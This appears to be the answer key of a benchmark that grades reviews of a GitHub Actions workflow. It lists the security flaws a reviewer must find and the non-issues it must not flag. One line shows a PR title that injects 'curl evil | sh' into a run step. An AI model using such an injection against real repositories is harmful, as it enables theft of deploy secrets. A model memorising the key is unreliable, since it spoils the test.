must_find.summary: pull_request_target checks out the PR head (fork code) and runs `npm ci` / `npm run build` (install scripts, build config) with secrets and a write token available. A fork author can steal PREVIEW_DEPLOY_TOKEN or push to the repo, and since it reruns on `synchronize`, they can push malicious code after a maintainer applies the label. Build untrusted code in a `pull_request` workflow without secrets and deploy the artifact from a separate trusted job (e.g. workflow_run).

`${{ github.event.pull_request.title }}` is interpolated straight into the run: script, so a PR titled like `"; curl evil | sh; "` runs arbitrary shell commands in a job holding the deploy secret. It breaks the README rule to pass untrusted values via env:.
`permissions: write-all` violates the least-privilege rule; the job needs only contents: read and pull-requests: write (for the comment).
thollander/actions-comment-pull-request@v3 is a third-party action pinned to a mutable tag, not a full commit SHA, as the README requires (and it runs with write-all and secrets in reach).

must_not_flag.summary: actions/checkout and actions/setup-node are pinned to full SHAs with tag comments; NOT unpinned.
The concurrency group keyed by PR number with cancel-in-progress is fine.
Interpolating github.event.pull_request.number (an integer) is NOT an injection vector on its own; the title is.
